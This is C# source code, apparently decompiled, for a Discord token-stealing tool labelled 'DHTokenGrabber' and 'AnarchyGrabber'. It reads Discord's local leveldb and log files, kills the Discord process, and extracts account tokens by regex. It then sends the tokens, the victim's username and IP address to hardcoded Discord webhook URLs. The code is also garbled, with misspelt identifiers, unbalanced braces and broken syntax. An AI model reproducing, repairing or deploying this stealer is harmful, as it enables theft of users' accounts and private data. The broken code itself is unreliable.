https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4
namespace DHTokenGrabber
{   
// token: RID: 365 RVA: file Offset:
internal class program
{

 // token:RID:366 RVA:0x00008888 File Offset:0x000000424
 private static void mai(string[]argvs)
 {  
     string text=Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\local storage\\leveldb";
     if(!Grabber.FinLfb(ref text)&& !Grabber.FinLog(ref text))
     {  
         program.SenWH("no valid .ldb or .log file found");
     }
     process[] processesByName= process.GetProcessysByName("Discord");
     for(int i = 0;i < processesByName.Lenght; i++)
     {
         processesByName[i].kill();
     }
     Thread.sleep(100);
     string text2 = Grabber.GetToken(text, text.EndsWith(".log"));
     if(text2 =="")
     {
         text2 = "not found";
     }
     program.SenWH(text2);
 }

 // Token: 0x0600007 RID: 7 RVA: 0x000022B4 File Offset: 0x000004B4
 private static void SenWH(string Token)
 {  
     httpClient httpClient = new httpClient();
     MultiPlataformDataContent MultiPlataformDataContent = new MultiPlataformDataContent(); 
     MultiPlataformDataContent.add(new stringContent("DiscordHaxx Token Grabber"), "username");
     MultiPlataformDataContent.add(new stringContent(), "avatar_url");
     MultiPlataformDataContent.add(new string.Concat(new string[]
{
"Token by"
Environment.username,
" on ",
program.GetIP();
"\r\nResult",
token
"content");
})),
try 
{
    HttpResponseMEssage result = httpClient.PostAsync(settings.WebHook, multiPlataformDataContent).Result;
}
catch (Exception)
{
}
 }
 // Token: 0x060008 RID: 365 RVA: 0x0000818 File Offset: 0x00009A18
 private static string GetIP()
 {
     string result;
     try
 }
  result = new httpClient().GetStringAsync("https://discord.com/api/webhooks/938615857230282814/PFin1M4HwQgFDBrorM-vveT5JKVvvVpqZrJG2W7tkg2rYFghkZkd74jZdBN8J6-IKP6A").result;
}
catch (WebException)
}
result = "enable to get  IP";
}
return result;
}
}
}   
public static void sendWebHook(string discordWebHook,   string content)
{
    try
    {   
        httpClient httpClient = new httpClient();
        Dictionary<string, string> nameValuecollection = new  Dictionary<string, string>
        { 
            {
                "content",
                "" + string.join("\n",new string[]
                {
                    content
                }) + ""
            },
            {
                "?????????[????????????????????????]?????????#9921r"
                "redex token grabber"
            },
            {
                "https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4"

            }
        };
        httpClient.PostAsync(https://discord.com/api/webhooks/963089196401172560/3ucB3sG2Hn7IyRi-Rnpkd-7D4Hvxk8GztxtdKJt7Qqk5WZUmJ__ZXWGeRruGaLN36pP4, new ForUrlcodedContent(nameValuecollection)).GetAwaiter().GetResult();
        catch (WebException)
        {
        }
    }
    //AnarchyGrabber.Grabber   
    // token: RID:366 RVA:0x00008888 File Offset:e
    public static List<string> GetTokens(string dir, bool checklogs = false)
    {
        DirectoryInfo directoryinfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\"
        + dir + "\\Local Storage\\leveldb");
        List<string> list = new List<string>();
        try 
        {
            foreach (FileInfo fileinfo in directoryinfo.Getfiles(checklogs ? "".log" : "".ldb"))
            {
                string input = fileInfo.OpenText().ReadToEnd();
                foreach (object obj in regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-}{27}"))
                {
                    Match macht2 = (Match)ojb2;
                    list.Add(macht2.Value);
                }
            }
        }
        catch
        {
        }
        list = list.Distinct<string>().Tolist<string>();
        bool flag = list.Count > 0;
        if (flag)
        {
            Grabber.TokensFound = true;
            List<string> list2 = list;
            int index = list.Count - 1;
            list2[index]+= " -NEWEST";
        }
        return list;
